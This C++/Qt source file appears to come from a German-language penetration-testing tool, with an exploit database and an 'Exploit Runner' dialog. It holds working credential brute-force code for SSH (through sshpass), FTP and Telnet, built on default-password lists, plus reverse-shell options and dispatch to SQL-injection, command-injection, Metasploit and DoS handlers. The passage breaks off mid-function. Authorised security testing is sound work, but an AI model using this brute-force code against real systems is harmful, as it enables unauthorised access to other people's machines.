#include <QtWidgets/QMessageBox>
#include <QtWidgets/QInputDialog>
#include <QtCore/QStandardPaths>
#include <QtCore/QDir>
#include <QtCore/QJsonDocument>
#include <QtCore/QJsonObject>
#include <QtCore/QJsonArray>
#include "exploitsystem.h"

ExploitDatabase* ExploitDatabase::s_instance = nullptr;

ExploitDatabase* ExploitDatabase::instance()
{
    if (!s_instance) {
        s_instance = new ExploitDatabase();
    }
    return s_instance;
}

ExploitDatabase::ExploitDatabase()
{
    initializeBuiltinExploits();
    loadExploitsFromFile();
}

void ExploitDatabase::initializeBuiltinExploits()
{
    m_exploits.append(BuiltinExploits::createSSHBruteForce());
    m_exploits.append(BuiltinExploits::createFTPBruteForce());
    m_exploits.append(BuiltinExploits::createHTTPBruteForce());
    m_exploits.append(BuiltinExploits::createSQLInjection());
    m_exploits.append(BuiltinExploits::createSMBNullSession());
    m_exploits.append(BuiltinExploits::createTelnetBruteForce());
    m_exploits.append(BuiltinExploits::createSNMPBruteForce());
}

QList<ExploitInfo> ExploitDatabase::getExploitsForVulnerability(const VulnerabilityInfo &vuln)
{
    QList<ExploitInfo> matchingExploits;

    for (const ExploitInfo &exploit : m_exploits) {
        if (exploit.targetService.toLower() == vuln.service.toLower() ||
            exploit.targetPort == vuln.port) {
            matchingExploits.append(exploit);
        }
    }

    return matchingExploits;
}

QList<ExploitInfo> ExploitDatabase::getExploitsForService(const QString &service, int port)
{
    QList<ExploitInfo> matchingExploits;

    for (const ExploitInfo &exploit : m_exploits) {
        if (exploit.targetService.toLower() == service.toLower() ||
            exploit.targetPort == port) {
            matchingExploits.append(exploit);
        }
    }

    return matchingExploits;
}

ExploitWorker::ExploitWorker(const VulnerabilityInfo &vulnerability, const ExploitInfo &exploit, const QString &targetIp)
    : m_vulnerability(vulnerability), m_exploit(exploit), m_targetIp(targetIp)
{
    m_socket = nullptr;
    m_process = nullptr;
    setAutoDelete(true);
}

void ExploitWorker::run()
{
    emit exploitStarted(m_exploit.id, m_targetIp);

    m_result.exploitId = m_exploit.id;
    m_result.targetIp = m_targetIp;
    m_result.targetPort = m_exploit.targetPort;
    m_result.executionTime = QDateTime::currentDateTime();
    m_result.successful = false;

    try {
        switch (m_exploit.type) {
        case ExploitType::CREDENTIAL_ATTACK:
            executeCredentialAttack();
            break;
        case ExploitType::BUFFER_OVERFLOW:
            executeBufferOverflow();
            break;
        case ExploitType::SQL_INJECTION:
            executeSQLInjection();
            break;
        case ExploitType::COMMAND_INJECTION:
            executeCommandInjection();
            break;
        case ExploitType::METASPLOIT_MODULE:
            executeMetasploitModule();
            break;
        case ExploitType::CUSTOM_SCRIPT:
            executeCustomScript();
            break;
        case ExploitType::DENIAL_OF_SERVICE:
            executeDenialOfService();
            break;
        default:
            m_result.errorMessage = "Exploit type not implemented";
            emit exploitFailed(m_exploit.id, m_result.errorMessage);
            return;
        }

        emit exploitCompleted(m_exploit.id, m_result);

    } catch (const std::exception &e) {
        m_result.errorMessage = QString("Exception: %1").arg(e.what());
        emit exploitFailed(m_exploit.id, m_result.errorMessage);
    }

    if (m_socket) {
        m_socket->deleteLater();
    }
    if (m_process) {
        m_process->kill();
        m_process->deleteLater();
    }
}

void ExploitWorker::executeCredentialAttack()
{
    emit exploitProgress(m_exploit.id, 10, "Starting credential attack...");

    // Common credentials for different services
    QStringList commonUsers = {"admin", "administrator", "root", "user", "guest", "test", "demo"};
    QStringList commonPasswords = {"", "admin", "password", "123456", "admin123", "root", "guest", "test"};

    if (m_exploit.targetService.toLower() == "ssh") {
        commonUsers << "ubuntu" << "pi" << "vagrant";
        commonPasswords << "ubuntu" << "raspberry" << "vagrant";
    } else if (m_exploit.targetService.toLower() == "ftp") {
        commonUsers << "anonymous" << "ftp";
        commonPasswords << "" << "ftp" << "anonymous";
    }

    int totalAttempts = commonUsers.size() * commonPasswords.size();
    int currentAttempt = 0;

    for (const QString &username : commonUsers) {
        for (const QString &password : commonPasswords) {
            currentAttempt++;
            int progress = 10 + (currentAttempt * 80) / totalAttempts;

            emit exploitProgress(m_exploit.id, progress,
                                 QString("Trying %1:%2").arg(username, password.isEmpty() ? "<empty>" : password));

            if (testCredentials(username, password)) {
                m_result.successful = true;
                m_result.gainedAccess = QString("Valid credentials: %1:%2").arg(username, password);
                m_result.output += QString("SUCCESS: %1:%2\n").arg(username, password);
                extractSystemInfo();
                return;
            }

            QThread::msleep(100); // Prevent flooding
        }
    }

    m_result.output += "No valid credentials found with common combinations";
}

bool ExploitWorker::testCredentials(const QString &username, const QString &password)
{
    if (m_exploit.targetService.toLower() == "ssh") {
        return testSSHCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "ftp") {
        return testFTPCredentials(username, password);
    } else if (m_exploit.targetService.toLower() == "telnet") {
        return testTelnetCredentials(username, password);
    }

    return false;
}

bool ExploitWorker::testSSHCredentials(const QString &username, const QString &password)
{
    // In a real implementation, you would use libssh or similar
    // For this example, we'll simulate the test
    QProcess sshProcess;

    QString command = QString("sshpass -p '%1' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no %2@%3 'echo SUCCESS'")
                          .arg(password, username, m_targetIp);

    sshProcess.start("bash", QStringList() << "-c" << command);
    sshProcess.waitForFinished(10000);

    QString output = sshProcess.readAllStandardOutput();
    return output.contains("SUCCESS");
}

bool ExploitWorker::testFTPCredentials(const QString &username, const QString &password)
{
    QTcpSocket socket;
    socket.connectToHost(m_targetIp, m_exploit.targetPort);

    if (!socket.waitForConnected(5000)) {
        return false;
    }

    // Read welcome message
    socket.waitForReadyRead(2000);
    socket.readAll();

    // Send username
    socket.write(QString("USER %1\r\n").arg(username).toUtf8());
    socket.waitForReadyRead(2000);
    QString response = socket.readAll();

    if (response.startsWith("331")) {
        // Send password
        socket.write(QString("PASS %1\r\n").arg(password).toUtf8());
        socket.waitForReadyRead(2000);
        response = socket.readAll();

        if (response.startsWith("230")) {
            socket.write("QUIT\r\n");
            return true;
        }
    }

    socket.close();
    return false;
}

ExploitDialog::ExploitDialog(const VulnerabilityInfo &vulnerability, QWidget *parent)
    : QDialog(parent), m_vulnerability(vulnerability), m_currentWorker(nullptr), m_exploitRunning(false)
{
    setWindowTitle(QString("🔥 Exploit Runner - %1").arg(vulnerability.title));
    resize(800, 600);
    setModal(true);

    showWarningDialog();
    setupUI();
    loadAvailableExploits();
}

void ExploitDialog::showWarningDialog()
{
    QMessageBox::StandardButton reply = QMessageBox::warning(this,
                                                             "⚠️ WARNUNG - Exploit Execution",
                                                             "WICHTIGER SICHERHEITSHINWEIS:\n\n"
                                                             "• Diese Funktion führt echte Angriffe auf Zielsysteme aus\n"
                                                             "• Verwenden Sie dies nur in Ihrem eigenen Netzwerk\n"
                                                             "• Stellen Sie sicher, dass Sie die Berechtigung haben\n"
                                                             "• Exploits können Systeme beschädigen oder destabilisieren\n"
                                                             "• Dokumentieren Sie alle Tests für Compliance\n\n"
                                                             "Möchten Sie fortfahren?",
                                                             QMessageBox::Yes | QMessageBox::No | QMessageBox::Cancel);

    if (reply != QMessageBox::Yes) {
        reject();
        return;
    }
}

void ExploitDialog::setupUI()
{
    QVBoxLayout *mainLayout = new QVBoxLayout(this);

    // Target info header
    QGroupBox *targetGroup = new QGroupBox("🎯 Target Information");
    QGridLayout *targetLayout = new QGridLayout(targetGroup);

    targetLayout->addWidget(new QLabel("Vulnerability:"), 0, 0);
    targetLayout->addWidget(new QLabel(m_vulnerability.title), 0, 1);
    targetLayout->addWidget(new QLabel("Service:"), 1, 0);
    targetLayout->addWidget(new QLabel(QString("%1:%2").arg(m_vulnerability.service).arg(m_vulnerability.port)), 1, 1);
    targetLayout->addWidget(new QLabel("Severity:"), 2, 0);

    QString severityText;
    switch (m_vulnerability.severity) {
    case VulnSeverity::CRITICAL: severityText = "🔴 CRITICAL"; break;
    case VulnSeverity::HIGH: severityText = "🟠 HIGH"; break;
    case VulnSeverity::MEDIUM: severityText = "🟡 MEDIUM"; break;
    case VulnSeverity::LOW: severityText = "🟢 LOW"; break;
    case VulnSeverity::INFO: severityText = "ℹ️ INFO"; break;
    }
    targetLayout->addWidget(new QLabel(severityText), 2, 1);

    mainLayout->addWidget(targetGroup);

    // Tab widget for different sections
    m_tabWidget = new QTabWidget();

    // Exploit Selection Tab
    QWidget *exploitTab = new QWidget();
    QHBoxLayout *exploitLayout = new QHBoxLayout(exploitTab);

    // Left side: exploit list
    QVBoxLayout *leftLayout = new QVBoxLayout();
    leftLayout->addWidget(new QLabel("🔥 Available Exploits:"));

    m_exploitTable = new QTableWidget();
    m_exploitTable->setColumnCount(5);
    m_exploitTable->setHorizontalHeaderLabels({"Name", "Type", "Difficulty", "Success Rate", "Requirements"});
    m_exploitTable->horizontalHeader()->setStretchLastSection(true);
    m_exploitTable->setSelectionBehavior(QAbstractItemView::SelectRows);
    leftLayout->addWidget(m_exploitTable);

    // Control buttons
    QHBoxLayout *controlLayout = new QHBoxLayout();
    m_runExploitButton = new QPushButton("🚀 Run Exploit");
    m_runExploitButton->setStyleSheet("QPushButton { background-color: #dc3545; color: white; font-weight: bold; }");
    m_stopExploitButton = new QPushButton("⏹️ Stop");
    m_stopExploitButton->setEnabled(false);

    controlLayout->addWidget(m_runExploitButton);
    controlLayout->addWidget(m_stopExploitButton);
    controlLayout->addStretch();

    leftLayout->addLayout(controlLayout);

    // Progress and status
    m_statusLabel = new QLabel("Ready to execute exploit");
    m_progressBar = new QProgressBar();
    leftLayout->addWidget(m_statusLabel);
    leftLayout->addWidget(m_progressBar);

    exploitLayout->addLayout(leftLayout, 2);

    // Right side: exploit details
    QVBoxLayout *rightLayout = new QVBoxLayout();
    rightLayout->addWidget(new QLabel("📋 Exploit Details:"));

    m_exploitDetails = new QTextEdit();
    m_exploitDetails->setReadOnly(true);
    m_exploitDetails->setMaximumWidth(300);
    rightLayout->addWidget(m_exploitDetails);

    exploitLayout->addLayout(rightLayout, 1);

    m_tabWidget->addTab(exploitTab, "🔥 Exploits");

    // Configuration Tab
    QWidget *configTab = new QWidget();
    QVBoxLayout *configLayout = new QVBoxLayout(configTab);

    QGroupBox *payloadGroup = new QGroupBox("⚙️ Payload Configuration");
    QFormLayout *payloadLayout = new QFormLayout(payloadGroup);

    m_payloadEdit = new QLineEdit();
    m_timeoutSpinBox = new QSpinBox();
    m_timeoutSpinBox->setRange(5, 300);
    m_timeoutSpinBox->setValue(30);
    m_timeoutSpinBox->setSuffix(" sec");

    payloadLayout->addRow("Custom Payload:", m_payloadEdit);
    payloadLayout->addRow("Timeout:", m_timeoutSpinBox);

    QGroupBox *shellGroup = new QGroupBox("🐚 Reverse Shell Options");
    QFormLayout *shellLayout = new QFormLayout(shellGroup);

    m_reverseShellCheckBox = new QCheckBox("Enable Reverse Shell");
    m_listenerPortEdit = new QLineEdit("4444");
    m_shellTypeCombo = new QComboBox();
    m_shellTypeCombo->addItems({"bash", "sh", "cmd", "powershell", "python", "perl"});
    m_verboseOutputCheckBox = new QCheckBox("Verbose Output");
    m_verboseOutputCheckBox->setChecked(true);

    shellLayout->addRow(m_reverseShellCheckBox);
    shellLayout->addRow("Listener Port:", m_listenerPortEdit);
    shellLayout->addRow("Shell Type:", m_shellTypeCombo);
    shellLayout->addRow(m_verboseOutputCheckBox);

    configLayout->addWidget(payloadGroup);
    configLayout->addWidget(shellGroup);
    configLayout->addStretch();

    m_tabWidget->addTab(configTab, "⚙️ Config");

    // Results Tab
    QWidget *resultsTab = new QWidget();
    QVBoxLayout *resultsLayout = new QVBoxLayout(resultsTab);

    QLabel *outputLabel = new QLabel("📤 Exploit Output:");
    m_outputEdit = new QTextEdit();
    m_outputEdit->setFont(QFont("Consolas", 10));

    QLabel *errorLabel = new QLabel("❌ Errors:");
    m_errorEdit = new QTextEdit();
    m_errorEdit->setMaximumHeight(100);
    m_errorEdit->setStyleSheet("QTextEdit { background-color: #2d1b1b; color: #ff6b6b; }");

    QLabel *sessionLabel = new QLabel("🔗 Active Sessions:");
    m_sessionTable = new QTableWidget();
    m_sessionTable->setColumnCount(4);
    m_sessionTable->setHorizontalHeaderLabels({"Session ID", "Type", "Target", "Status"});
    m_sessionTable->setMaximumHeight(120);

    QHBoxLayout *resultButtonLayout = new QHBoxLayout();
    m_saveResultsButton = new QPushButton("💾 Save Results");
    m_openShellButton = new QPushButton("🐚 Open Shell");
    m_openShellButton->setEnabled(false);

    resultButtonLayout->addWidget(m_saveResultsButton);
    resultButtonLayout->addWidget(m_openShellButton);
    resultButtonLayout->addStretch();

    resultsLayout->addWidget(outputLabel);
    resultsLayout->addWidget(m_outputEdit, 2);
    resultsLayout->addWidget(errorLabel);
    resultsLayout->addWidget(m_errorEdit);
    resultsLayout->addWidget(sessionLabel);
    resultsLayout->addWidget(m_sessionTable);
    resultsLayout->addLayout(resultButtonLayout);

    m_tabWidget->addTab(resultsTab, "📊 Results");

    mainLayout->addWidget(m_tabWidget);

    // Bottom buttons
    QHBoxLayout *bottomLayout = new QHBoxLayout();
    QPushButton *closeButton = new QPushButton("❌ Close");
    QPushButton *helpButton = new QPushButton("❓ Help");

    bottomLayout->addWidget(helpButton);
    bottomLayout->addStretch();
    bottomLayout->addWidget(closeButton);

    mainLayout->addLayout(bottomLayout);

    // Connect signals
    connect(m_exploitTable, &QTableWidget::itemSelectionChanged, this, &ExploitDialog::onExploitSelected);
    connect(m_runExploitButton, &QPushButton::clicked, this, &ExploitDialog::runSelectedExploit);
    connect(m_stopExploitButton, &QPushButton::clicked, this, &ExploitDialog::stopExploit);
    connect(m_saveResultsButton, &QPushButton::clicked, this, &ExploitDialog::saveExploitResults);
    connect(m_openShellButton, &QPushButton::clicked, this, &ExploitDialog::openReverseShell);
    connect(closeButton, &QPushButton::clicked, this, &QDialog::accept);

    connect(helpButton, &QPushButton::clicked, [this]() {
        QMessageBox::information(this, "❓ Exploit Runner Help",
                                 "🔥 EXPLOIT RUNNER HILFE\n\n"
                                 "📋 Exploit Auswahl:\n"
                                 "• Wählen Sie einen passenden Exploit aus der Liste\n"
                                 "• Überprüfen Sie die Anforderungen und Erfolgsrate\n"
                                 "• Konfigurieren Sie ggf. custom Payloads\n\n"
                                 "⚙️ Konfiguration:\n"
                                 "• Passen Sie Timeouts an das Zielsystem an\n"
                                 "• Aktivieren Sie Reverse Shell für interaktive Zugriffe\n"
                                 "• Verbose Output für detaillierte Logs\n\n"
                                 "🚀 Ausführung:\n"
                                 "• Klicken Sie 'Run Exploit' zum Starten\n"
                                 "• Überwachen Sie den Fortschritt im Status\n"
                                 "• Ergebnisse werden im Results Tab angezeigt\n\n"
                                 "⚠️ WICHTIG:\n"
                                 "• Nur in autorisierten Netzwerken verwenden\n"
                                 "• Dokumentieren Sie alle Tests\n"
                                 "• Stoppen Sie Exploits bei Problemen sofort");
    });
}

void ExploitDialog::loadAvailableExploits()
{
    m_availableExploits = ExploitDatabase::instance()->getExploitsForVulnerability(m_vulnerability);

    // Add Metasploit modules if available
    QStringList metasploitModules = getMetasploitModules(m_vulnerability.service, m_vulnerability.port);
    for (const QString &module : metasploitModules) {
        ExploitInfo metasploitExploit;
        metasploitExploit.id = QString("msf_%1").arg(module);
        metasploitExploit.name = QString("Metasploit: %1").arg(module);
        metasploitExploit.description = QString("Metasploit module for %1").arg(m_vulnerability.service);
        metasploitExploit.type = ExploitType::METASPLOIT_MODULE;
        metasploitExploit.targetService = m_vulnerability.service;
        metasploitExploit.targetPort = m_vulnerability.port;
        metasploitExploit.metasploitModule = module;
        metasploitExploit.requirements = "Metasploit Framework";
        metasploitExploit.successRate = 0.6;
        metasploitExploit.difficulty = "medium";
        m_availableExploits.append(metasploitExploit);
    }

    // Populate table
    setupExploitList();
}

void ExploitDialog::setupExploitList()
{
    m_exploitTable->setRowCount(m_availableExploits.size());

    for (int i = 0; i < m_availableExploits.size(); ++i) {
        const ExploitInfo &exploit = m_availableExploits[i];

        m_exploitTable->setItem(i, 0, new QTableWidgetItem(exploit.name));

        QString typeStr;
        switch (exploit.type) {
        case ExploitType::CREDENTIAL_ATTACK: typeStr = "🔑 Credentials"; break;
        case ExploitType::BUFFER_OVERFLOW: typeStr = "💥 Buffer Overflow"; break;
        case ExploitType::SQL_INJECTION: typeStr = "🗃️ SQL Injection"; break;
        case ExploitType::XSS_ATTACK: typeStr = "🌐 XSS"; break;
        case ExploitType::COMMAND_INJECTION: typeStr = "⚡ Command Injection"; break;
        case ExploitType::PRIVILEGE_ESCALATION: typeStr = "⬆️ Privilege Escalation"; break;
        case ExploitType::DENIAL_OF_SERVICE: typeStr = "💥 DoS"; break;
        case ExploitType::METASPLOIT_MODULE: typeStr = "🚀 Metasploit"; break;
        case ExploitType::CUSTOM_SCRIPT: typeStr = "📜 Custom"; break;
        }
        m_exploitTable->setItem(i, 1, new QTableWidgetItem(typeStr));

        // Difficulty with color coding
        QTableWidgetItem *difficultyItem = new QTableWidgetItem(exploit.difficulty.toUpper());
        if (exploit.difficulty == "easy") {
            difficultyItem->setBackground(QColor(40, 167, 69, 100));
        } else if (exploit.difficulty == "medium") {
            difficultyItem->setBackground(QColor(255, 193, 7, 100));
        } else if (exploit.difficulty == "hard") {
            difficultyItem->setBackground(QColor(220, 53, 69, 100));
        } else {
            difficultyItem->setBackground(QColor(108, 117, 125, 100));
        }
        m_exploitTable->setItem(i, 2, difficultyItem);

        // Success rate
        QTableWidgetItem *successItem = new QTableWidgetItem(QString("%1%").arg(exploit.successRate * 100, 0, 'f', 0));
        if (exploit.successRate >= 0.7) {
            successItem->setBackground(QColor(40, 167, 69, 100));
        } else if (exploit.successRate >= 0.4) {
            successItem->setBackground(QColor(255, 193, 7, 100));
        } else {
            successItem->setBackground(QColor(220, 53, 69, 100));
        }
        m_exploitTable->setItem(i, 3, successItem);

        m_exploitTable->setItem(i, 4, new QTableWidgetItem(exploit.requirements));
    }

    m_exploitTable->resizeColumnsToContents();
}

void ExploitDialog::onExploitSelected()
{
    int currentRow = m_exploitTable->currentRow();
    if (currentRow < 0 || currentRow >= m_availableExploits.size()) {
        return;
    }

    m_selectedExploit = m_availableExploits[currentRow];
    updateExploitDetails();

    // Enable run button
    m_runExploitButton->setEnabled(!m_exploitRunning);

    // Update payload field with default payload
    m_payloadEdit->setText(m_selectedExploit.payload);
}

void ExploitDialog::updateExploitDetails()
{
    QString details = QString(R"(
<h3>🔥 %1</h3>

<h4>📋 Description:</h4>
<p>%2</p>

<h4>🎯 Target Information:</h4>
<table border="0" cellpadding="3">
<tr><td><b>Service:</b></td><td>%3</td></tr>
<tr><td><b>Port:</b></td><td>%4</td></tr>
<tr><td><b>Type:</b></td><td>%5</td></tr>
<tr><td><b>Difficulty:</b></td><td>%6</td></tr>
</table>

<h4>📊 Statistics:</h4>
<table border="0" cellpadding="3">
<tr><td><b>Success Rate:</b></td><td>%7%</td></tr>
<tr><td><b>Requires Auth:</b></td><td>%8</td></tr>
<tr><td><b>Author:</b></td><td>%9</td></tr>
</table>

<h4>⚙️ Requirements:</h4>
<p>%10</p>

<h4>🚀 Payload:</h4>
<pre style="background: #1a1a1a; padding: 10px; border-radius: 5px;">%11</pre>

%12
    )").arg(m_selectedExploit.name)
                          .arg(m_selectedExploit.description)
                          .arg(m_selectedExploit.targetService)
                          .arg(m_selectedExploit.targetPort)
                          .arg([](ExploitType type) {
                              switch (type) {
                              case ExploitType::CREDENTIAL_ATTACK: return "Credential Attack";
                              case ExploitType::BUFFER_OVERFLOW: return "Buffer Overflow";
                              case ExploitType::SQL_INJECTION: return "SQL Injection";
                              case ExploitType::XSS_ATTACK: return "XSS Attack";
                              case ExploitType::COMMAND_INJECTION: return "Command Injection";
                              case ExploitType::PRIVILEGE_ESCALATION: return "Privilege Escalation";
                              case ExploitType::DENIAL_OF_SERVICE: return "Denial of Service";
                              case ExploitType::METASPLOIT_MODULE: return "Metasploit Module";
                              case ExploitType::CUSTOM_SCRIPT: return "Custom Script";
                              }
                              return "Unknown";
                          }(m_selectedExploit.type))
                          .arg(m_selectedExploit.difficulty.toUpper())
                          .arg(m_selectedExploit.successRate * 100, 0, 'f', 0)
                          .arg(m_selectedExploit.requiresAuth ? "Yes" : "No")
                          .arg(m_selectedExploit.author)
                          .arg(m_selectedExploit.requirements)
                          .arg(m_selectedExploit.payload)
                          .arg(!m_selectedExploit.cveId.isEmpty() ?
                                   QString("<h4>🔗 CVE Reference:</h4><p>%1</p>").arg(m_selectedExploit.cveId) : "");

    m_exploitDetails->setHtml(details);
}

void ExploitDialog::runSelectedExploit()
{
    if (m_selectedExploit.id.isEmpty()) {
        QMessageBox::warning(this, "⚠️ Warning", "Please select an exploit first!");
        return;
    }

    // Final confirmation
    QMessageBox::StandardButton reply = QMessageBox::question(this,
                                                              "🚀 Confirm Exploit Execution",
                                                              QString("Are you sure you want to run this exploit?\n\n"
                                                                      "Target: %1:%2\n"
                                                                      "Exploit: %3\n"
                                                                      "Type: %4\n\n"
                                                                      "This action will attempt to exploit the target system!")
                                                                  .arg(m_vulnerability.service)
                                                                  .arg(m_vulnerability.port)
                                                                  .arg(m_selectedExploit.name)
                                                                  .arg(m_selectedExploit.targetService),
                                                              QMessageBox::Yes | QMessageBox::No);

    if (reply != QMessageBox::Yes) {
        return;
    }

    // Clear previous results
    m_outputEdit->clear();
    m_errorEdit->clear();
    m_sessionTable->setRowCount(0);

    // Update UI state
    m_exploitRunning = true;
    m_runExploitButton->setEnabled(false);
    m_stopExploitButton->setEnabled(true);
    m_progressBar->setValue(0);
    m_statusLabel->setText("🚀 Starting exploit...");

    // Switch to results tab
    m_tabWidget->setCurrentIndex(2);

    // Get target IP from vulnerability (assuming it's stored there)
    QString targetIp = "192.168.1.100"; // This should come from the vulnerability or be configurable

    // Create and start exploit worker
    m_currentWorker = new ExploitWorker(m_vulnerability, m_selectedExploit, targetIp);

    connect(m_currentWorker, &ExploitWorker::exploitStarted,
            this, &ExploitDialog::onExploitStarted);
    connect(m_currentWorker, &ExploitWorker::exploitProgress,
            this, &ExploitDialog::onExploitProgress);
    connect(m_currentWorker, &ExploitWorker::exploitCompleted,
            this, &ExploitDialog::onExploitCompleted);
    connect(m_currentWorker, &ExploitWorker::exploitFailed,
            this, &ExploitDialog::onExploitFailed);
    connect(m_currentWorker, &ExploitWorker::shellObtained,
            this, &ExploitDialog::onShellObtained);

    QThreadPool::globalInstance()->start(m_currentWorker);
}

void ExploitDialog::stopExploit()
{
    if (m_currentWorker) {
        // In a real implementation, you would signal the worker to stop
        m_statusLabel->setText("⏹️ Stopping exploit...");
        m_exploitRunning = false;
        m_runExploitButton->setEnabled(true);
        m_stopExploitButton->setEnabled(false);

        m_outputEdit->append("\n🛑 EXPLOIT STOPPED BY USER\n");
    }
}

void ExploitDialog::onExploitStarted(const QString &exploitId, const QString &target)
{
    m_statusLabel->setText(QString("🚀 Running exploit %1 on %2").arg(exploitId, target));
    m_outputEdit->append(QString("=== EXPLOIT EXECUTION STARTED ===\n"));
    m_outputEdit->append(QString("Exploit ID: %1\n").arg(exploitId));
    m_outputEdit->append(QString("Target: %1\n").arg(target));
    m_outputEdit->append(QString("Start Time: %1\n").arg(QDateTime::currentDateTime().toString()));
    m_outputEdit->append(QString("===================================\n\n"));
}

void ExploitDialog::onExploitProgress(const QString &exploitId, int percentage, const QString &status)
{
    Q_UNUSED(exploitId)
    m_progressBar->setValue(percentage);
    m_statusLabel->setText(status);
    m_outputEdit->append(QString("[%1%] %2\n").arg(percentage).arg(status));
    m_outputEdit->ensureCursorVisible();
}

void ExploitDialog::onExploitCompleted(const QString &exploitId, const ExploitResult &result)
{
    Q_UNUSED(exploitId)

    m_exploitRunning = false;
    m_runExploitButton->setEnabled(true);
    m_stopExploitButton->setEnabled(false);
    m_progressBar->setValue(100);

    m_exploitResults.append(result);

    if (result.successful) {
        m_statusLabel->setText("✅ Exploit completed successfully!");
        m_statusLabel->setStyleSheet("color: #28a745; font-weight: bold;");

        m_outputEdit->append(QString("\n🎉 EXPLOIT SUCCESSFUL! 🎉\n"));
        m_outputEdit->append(QString("Gained Access: %1\n").arg(result.gainedAccess));
        m_outputEdit->append(QString("Session Info: %1\n").arg(result.sessionInfo));

        if (!result.extractedData.isEmpty()) {
            m_outputEdit->append(QString("\n📋 Extracted Data:\n"));
            for (const QString &data : result.extractedData) {
                m_outputEdit->append(QString("  • %1\n").arg(data));
            }
        }

        // Add session to table if shell was obtained
        if (!result.shellType.isEmpty()) {
            int row = m_sessionTable->rowCount();
            m_sessionTable->insertRow(row);
            m_sessionTable->setItem(row, 0, new QTableWidgetItem(QString("Session_%1").arg(row + 1)));
            m_sessionTable->setItem(row, 1, new QTableWidgetItem(result.shellType));
            m_sessionTable->setItem(row, 2, new QTableWidgetItem(QString("%1:%2").arg(result.targetIp).arg(result.connectionPort)));
            m_sessionTable->setItem(row, 3, new QTableWidgetItem("🟢 Active"));

            m_openShellButton->setEnabled(true);
        }

        // Show success message
        QMessageBox::information(this, "🎉 Exploit Successful",
                                 QString("Exploit executed successfully!\n\n"
                                         "Target: %1:%2\n"
                                         "Exploit: %3\n"
                                         "Access Gained: %4\n\n"
                                         "Check the Results tab for detailed information.")
                                     .arg(result.targetIp)
                                     .arg(result.targetPort)
                                     .arg(m_selectedExploit.name)
                                     .arg(result.gainedAccess));

    } else {
        m_statusLabel->setText("❌ Exploit failed");
        m_statusLabel->setStyleSheet("color: #dc3545; font-weight: bold;");

        m_outputEdit->append(QString("\n❌ EXPLOIT FAILED\n"));
        if (!result.errorMessage.isEmpty()) {
            m_errorEdit->append(result.errorMessage);
        }
    }

    m_outputEdit->append(QString("\nOutput:\n%1\n").arg(result.output));
    m_outputEdit->append(QString("\n=== EXPLOIT EXECUTION COMPLETED ===\n"));
    m_outputEdit->ensureCursorVisible();
}

void ExploitDialog::onExploitFailed(const QString &exploitId, const QString &error)
{
    Q_UNUSED(exploitId)

    m_exploitRunning = false;
    m_runExploitButton->setEnabled(true);
    m_stopExploitButton->setEnabled(false);

    m_statusLabel->setText("❌ Exploit failed");
    m_statusLabel->setStyleSheet("color: #dc3545; font-weight: bold;");

    m_outputEdit->append(QString("\n❌ EXPLOIT FAILED: %1\n").arg(error));
    m_errorEdit->append(error);
}

void ExploitDialog::onShellObtained(const QString &exploitId, const QString &shellInfo)
{
    Q_UNUSED(exploitId)

    m_outputEdit->append(QString("\n🐚 SHELL OBTAINED: %1\n").arg(shellInfo));
    m_openShellButton->setEnabled(true);

    // Show shell notification
    QMessageBox::information(this, "🐚 Shell Obtained",
                             QString("Interactive shell established!\n\n%1\n\nUse 'Open Shell' button to interact with the target.")
                                 .arg(shellInfo));
}

void ExploitDialog::saveExploitResults()
{
    if (m_exploitResults.isEmpty()) {
        QMessageBox::information(this, "💾 Save Results", "No results to save yet.");
        return;
    }

    QString fileName = QFileDialog::getSaveFileName(this,
                                                    "💾 Save Exploit Results",
                                                    QString("exploit_results_%1.html").arg(QDateTime::currentDateTime().toString("yyyyMMdd_hhmmss")),
                                                    "HTML Files (*.html);;JSON Files (*.json);;Text Files (*.txt)");

    if (fileName.isEmpty()) return;

    QFile file(fileName);
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QMessageBox::warning(this, "❌ Error", "Could not open file for writing");
        return;
    }

    QTextStream stream(&file);

    if (fileName.endsWith(".html")) {
        // Generate HTML report
        stream << generateHTMLExploitReport();
    } else if (fileName.endsWith(".json")) {
        // Generate JSON report
        stream << generateJSONExploitReport();
    } else {
        // Generate text report
        stream << generateTextExploitReport();
    }

    QMessageBox::information(this, "✅ Success",
                             QString("Exploit results saved successfully:\n%1").arg(fileName));
}

QString ExploitDialog::generateHTMLExploitReport()
{
    QString html = R"(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Exploit Execution Report</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1e1e1e; color: #fff; margin: 20px; }
        .header { background: #dc3545; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .success { background: #28a745; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .failure { background: #6c757d; padding: 15px; border-radius: 5px; margin: 10px 0; }
        .warning { background: #ffc107; color: #000; padding: 10px; border-radius: 5px; margin: 10px 0; }
        table { border-collapse: collapse; width: 100%; margin: 10px 0; }
        th, td { border: 1px solid #404040; padding: 8px; text-align: left; }
        th { background-color: #343a40; }
        pre { background: #2d2d2d; padding: 10px; border-radius: 5px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 Exploit Execution Report</h1>
        <p><strong>Generated:</strong> )" + QDateTime::currentDateTime().toString("dd.MM.yyyy hh:mm:ss") + R"(</p>
        <p><strong>Target:</strong> )" + m_vulnerability.service + ":" + QString::number(m_vulnerability.port) + R"(</p>
        <p><strong>Vulnerability:</strong> )" + m_vulnerability.title + R"(</p>
    </div>

    <div class="warning">
        <strong>⚠️ SECURITY NOTICE:</strong> This report contains sensitive penetration testing information.
        Handle with appropriate security measures and only share with authorized personnel.
    </div>
)";

    for (const ExploitResult &result : m_exploitResults) {
        QString statusClass = result.successful ? "success" : "failure";
        QString statusText = result.successful ? "✅ SUCCESS" : "❌ FAILED";

        html += QString(R"(
    <div class="%1">
        <h2>%2 - Exploit: %3</h2>
        <table>
            <tr><th>Target IP</th><td>%4</td></tr>
            <tr><th>Target Port</th><td>%5</td></tr>
            <tr><th>Execution Time</th><td>%6</td></tr>
            <tr><th>Status</th><td>%7</td></tr>
            %8
            %9
        </table>

        <h3>📤 Output:</h3>
        <pre>%10</pre>

        %11

        %12
    </div>
        )").arg(statusClass)
                    .arg(statusText)
                    .arg(result.exploitId)
                    .arg(result.targetIp)
                    .arg(result.targetPort)
                    .arg(result.executionTime.toString("dd.MM.yyyy hh:mm:ss"))
                    .arg(result.successful ? "Successful" : "Failed")
